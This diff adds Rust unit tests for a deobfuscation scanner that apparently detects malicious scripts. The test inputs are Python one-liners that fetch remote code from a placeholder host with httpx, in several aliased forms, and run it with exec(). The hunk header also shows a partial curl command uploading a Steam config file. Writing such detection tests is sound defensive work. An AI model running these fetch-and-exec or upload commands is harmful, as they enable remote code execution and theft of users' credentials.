@@ -20848,6 +20848,260 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_httpx_get_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; exec(httpx.get('https://py.example/httpx-get').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/httpx-get" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python httpx.get: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-get"
+                )
+            }),
+            "Python httpx.get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_module_alias_post_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx as hx; exec(hx.post('https://py.example/httpx-alias-post').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/httpx-alias-post" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python httpx module alias post: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://py.example/httpx-alias-post"
+                )
+            }),
+            "Python httpx module alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_import_alias_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from httpx import get as fetch; exec(fetch('https://py.example/httpx-import-alias').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/httpx-import-alias" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python httpx get import alias: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://py.example/httpx-import-alias"
+                )
+            }),
+            "Python httpx get import alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_assigned_get_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; fetch = httpx.get; exec(fetch('https://py.example/httpx-assigned-alias').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/httpx-assigned-alias" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python httpx assigned get alias: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://py.example/httpx-assigned-alias"
+                )
+            }),
+            "Python httpx assigned get alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_client_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; exec(httpx.Client().get('https://py.example/httpx-client').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/httpx-client" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python httpx.Client().get: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-client"
+                )
+            }),
+            "Python httpx.Client().get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_bound_client_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; c = httpx.Client(); exec(c.get('https://py.example/httpx-bound-client').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/httpx-bound-client" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python bound httpx.Client().get: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://py.example/httpx-bound-client"
+                )
+            }),
+            "Python bound httpx.Client().get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_bound_client_assigned_post_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; c = httpx.Client(); send = c.post; exec(send('https://py.example/httpx-bound-client-assigned').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/httpx-bound-client-assigned" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python assigned bound httpx.Client().post alias: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://py.example/httpx-bound-client-assigned"
+                )
+            }),
+            "Python assigned bound httpx.Client().post alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_imported_client_alias_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from httpx import Client as H; c = H(); exec(c.get('https://py.example/httpx-imported-client').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/httpx-imported-client" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python imported httpx Client alias: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://py.example/httpx-imported-client"
+                )
+            }),
+            "Python imported httpx Client alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_urlopen_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
